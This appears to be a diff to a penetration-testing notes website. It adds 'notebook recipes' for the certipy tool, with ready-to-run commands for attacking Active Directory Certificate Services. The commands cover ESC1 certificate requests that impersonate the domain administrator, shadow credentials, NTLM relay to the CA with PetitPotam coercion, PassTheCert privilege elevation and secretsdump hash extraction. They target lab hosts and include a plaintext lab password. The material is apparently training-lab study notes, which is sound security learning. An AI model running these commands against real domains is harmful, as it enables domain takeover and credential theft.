@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=certipy) · [All tools](/index)
+
 ## Find vulnerable templates
 
 **Kali**
@@ -40,9 +42,172 @@ DNS, DC time, and certificate identity must match the lab.
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=certipy)
+## Notebook recipes
 
-## Learning and original examples
+12 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [AD Certificate Services: Quick Reference](/active-directory/adcs)
-- [Pass the Certificate: PKINIT and Lab Walkthrough](/password-attacks/pass-the-certificate)
+<AccordionGroup>
+
+<Accordion title="AD Certificate Services: Quick Reference">
+
+### AD Certificate Services: Quick Reference
+
+**AD Certificate Services: Quick Reference**
+
+```bash
+# find vulnerable templates
+certipy find -u USER@$DOMAIN -p PASS -dc-ip $DC -vulnerable -stdout
+```
+
+</Accordion>
+
+<Accordion title="ESC1 — template allows SAN + client auth">
+
+### ESC1 — template allows SAN + client auth
+
+**AD Certificate Services: Quick Reference**
+
+```bash
+# request a cert AS the domain admin
+certipy req -u USER@$DOMAIN -p PASS -ca CA-NAME -template VulnTemplate -upn administrator@$DOMAIN -dc-ip $DC
+# authenticate with the cert -> get NT hash / TGT
+certipy auth -pfx administrator.pfx -dc-ip $DC
+```
+
+**AD Certificate Services: Quick Reference**
+
+Context from the notebook: ESC8 = NTLM relay to the CA's web enrollment ( certipy relay ). Certificates survive password resets, making them a durable foothold.
+
+```text
+certipy relay
+```
+
+</Accordion>
+
+<Accordion title="The three reusable &quot;I control a user&quot; primitives">
+
+### The three reusable "I control a user" primitives
+
+**BloodHound: Full Reference**
+
+```bash
+proxychains certipy shadow auto -u <you>@<domain> -p '<pass>' -account <target> -dc-ip <DC>
+#   -> prints the target's NT hash. (pywhisker + gettgtpkinit is the manual equivalent.)
+```
+
+</Accordion>
+
+<Accordion title="No PKINIT? → PassTheCert (fallback)">
+
+### No PKINIT? → PassTheCert (fallback)
+
+**Pass the Certificate: PKINIT and Lab Walkthrough**
+
+```bash
+certipy cert -pfx dc01.pfx -nokey  -out dc01.crt
+certipy cert -pfx dc01.pfx -nocert -out dc01.key
+python3 passthecert.py -action modify_user -crt dc01.crt -key dc01.key \
+  -domain inlanefreight.local -dc-ip 10.129.234.174 -target wwhite -elevate
+impacket-secretsdump 'inlanefreight.local/wwhite:package5shores_topher1'@10.129.234.174 -just-dc-user Administrator
+```
+
+</Accordion>
+
+<Accordion title="Step 0 — confirm the relay target exists">
+
+### Step 0 — confirm the relay target exists
+
+**Pass the Certificate: PKINIT and Lab Walkthrough**
+
+```bash
+echo "10.129.234.172  CA01.inlanefreight.local"            | sudo tee -a /etc/hosts
+echo "10.129.234.174  DC01.inlanefreight.local dc01 inlanefreight.local" | sudo tee -a /etc/hosts
+
+certipy find -u wwhite@inlanefreight.local -p 'package5shores_topher1' -dc-ip 10.129.234.174 -stdout
+curl -s --max-time 8 -o /dev/null -w "HTTP %{http_code}\n" http://10.129.234.172/certsrv/   # 401 = web enrollment live
+```
+
+**Pass the Certificate: PKINIT and Lab Walkthrough**
+
+Context from the notebook: certipy find  runs over  LDAP , which only the  DC  answers. The CA's web enrollment is checked separately, and the CA's DNS name may resolve to an unreachable internal IP — map it to the reachable one first so the check is accurate:
+
+```text
+certipy find
+```
+
+</Accordion>
+
+<Accordion title="Step 1 — relay + coerce (the cert)">
+
+### Step 1 — relay + coerce (the cert)
+
+**Pass the Certificate: PKINIT and Lab Walkthrough**
+
+```bash
+# Terminal 1 — relay (certipy relay is sturdier than ntlmrelayx for ADCS retrieval)
+certipy relay -target http://10.129.234.172 -template KerberosAuthentication -timeout 30
+
+# Terminal 2 — coerce the DC (.174) ONCE; PetitPotam is the reliable method here
+coercer coerce -u wwhite -p 'package5shores_topher1' -d inlanefreight.local \
+  -t 10.129.234.174 -l <tun0-IP> --filter-method-name EfsRpcAddUsersToFile
+```
+
+</Accordion>
+
+<Accordion title="Tooling &amp; install">
+
+### Tooling & install
+
+**Pass the Certificate: PKINIT and Lab Walkthrough**
+
+```bash
+pipx install certipy-ad        # command is `certipy`
+pipx install coercer           # command is `coercer`
+# pywhisker (real package → pipx works from repo root)
+git clone https://github.com/ShutdownRepo/pywhisker && cd pywhisker && pipx install .
+# PKINITtools = loose scripts, NOT a package → venv + run directly
+git clone https://github.com/dirkjanm/PKINITtools && cd PKINITtools
+python3 -m venv .venv && source .venv/bin/activate && pip install -r requirements.txt
+# if "Error detecting the version of libcrypto":
+pip3 install -I git+https://github.com/wbond/oscrypto.git
+```
+
+</Accordion>
+
+<Accordion title="ACL / object‑control edges (the escalation bread‑and‑butter)">
+
+### ACL / object‑control edges (the escalation bread‑and‑butter)
+
+**BloodHound: Full Reference**
+
+Context from the notebook: AddKeyCredentialLink Write  msDS-KeyCredentialLink  →  Shadow Credentials certipy shadow auto -u u@dom -p p -account &lt;target> -dc-ip &lt;DC>
+
+```text
+certipy shadow auto -u u@dom -p p -account <target> -dc-ip <DC>
+```
+
+</Accordion>
+
+<Accordion title="Troubleshooting log (everything that bit me, and the fix)">
+
+### Troubleshooting log (everything that bit me, and the fix)
+
+**Pass the Certificate: PKINIT and Lab Walkthrough**
+
+Context from the notebook: certipy relay ... Error during web certificate request: timed out CA slow + coercion flooding many sessions -timeout 30  and coerce  once
+
+```text
+certipy relay ... Error during web certificate request: timed out
+```
+
+**Pass the Certificate: PKINIT and Lab Walkthrough**
+
+Context from the notebook: certipy auth  / PKINIT reset, clock looks right Often still clock skew — your clock must match the  DC , not internet NTP (labs run their own time) sudo timedatectl set-ntp off ; read DC time  nmap -p445 --script smb2-time &lt;DC> ;  sudo date -u -s "..." . Verify  date -u  ≈ DC within 5 min
+
+```text
+certipy auth
+```
+
+</Accordion>
+
+</AccordionGroup>
